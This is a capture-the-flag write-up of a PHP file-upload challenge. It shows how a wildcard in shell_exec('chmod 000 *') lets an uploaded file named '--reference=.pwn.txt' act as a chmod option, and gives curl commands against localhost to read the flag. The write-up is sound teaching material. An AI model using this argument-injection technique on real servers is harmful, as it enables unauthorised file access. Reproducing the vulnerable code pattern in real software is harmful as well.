# Wildcard Injection

## Challenge Overview
We are presented with a simple web interface titled "Submit a Challenge". It allows users to upload files, which are allegedly only accessible to the admin. Upon inspection, the server runs on Apache/2.4.65 and PHP/8.4.

Initial attempts to upload standard web shells (`exploit.php`) fail due to extension filters, and successful uploads (like `.txt`) appear to be unreadable immediately after upload.

## Reconnaissance & Source Code Analysis
We were provided with the source code (Docker environment). Analyzing `index.php` revealed the critical logic:

```php
if (isset($_FILES['file'])) {
    $target_dir = "/var/www/html/uploads/";
    
    // 1. Extension Filter
    if (!str_ends_with($target_file, '.txt')) {
        die("Only .txt extensions allowed.");
    }

    // 2. File Upload
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);

    // 3. The "Cleanup" Command
    $old_path = getcwd();
    chdir($target_dir);
    shell_exec('chmod 000 *'); // <--- VULNERABILITY HERE
    chdir($old_path);
}
```

### The Obstacle
The line `shell_exec('chmod 000 *');` is intended to lock down all files in the directory immediately after upload.

- `chmod 000`: Sets permissions to `---------` (No read, no write, no execute).

- `*`: Expands to all files in the current directory.

## Vulnerability Analysis: Unix Wildcard Injection
The vulnerability lies in the use of the wildcard `*` inside `shell_exec`. In Linux, the shell expands the wildcard before passing the arguments to the command.

If we upload a file with a specific name, we can trick `chmod` into interpreting that filename as a command-line option.

The Attack Plan
We need to change the permissions of `flag.txt` to be readable. The `chmod` command supports a flag called `--reference=RFILE`, which sets permissions to match `RFILE` instead of the mode specified.

The exploit requires two steps:

1. Bypass the `*` expansion: We need a helper file that won't get locked by `chmod 000 *`. In Linux, * does not match hidden files (files starting with .).
2. Inject the argument: We need a file named `--reference=.pwn.txt`.

What happens on the server: When the PHP script runs `shell_exec('chmod 000 *')`, the shell expands it to:

```bash
chmod 000 flag.txt --reference=.pwn.txt
```

The `chmod` command interprets `--reference=.pwn.txt` as an option, ignoring the 000 mode, and applies the permissions of `.pwn.txt` (readable) to `flag.txt`.

## Exploitation Steps
We used `curl` to perform the attack to handle the specific filenames required.

1. Upload the "Hidden Helper"
We upload a file named .pwn.txt. The server attempts to run chmod 000 *, but since this file starts with a dot, it is ignored and retains its default readable permissions (usually 644).

```bash
curl -F "file=@payload.txt;filename=.pwn.txt" -F "submit=Submit Challenge" http://localhost:8080/
```

2. Inject the Wildcard
We upload a file named `--reference=.pwn.txt`. The server expands the wildcard, sees this filename, and treats it as a flag for the command.

```bash
curl -F "file=@payload.txt;filename=--reference=.pwn.txt" -F "submit=Submit Challenge" http://localhost:8080/
```

3. Retrieve the Flag
With the permissions successfully copied from the helper file to the flag, `flag.txt` is now readable.

```bash
curl http://localhost:8080/uploads/flag.txt
```

## Result
The server responded with the flag content: flag{fakeflag}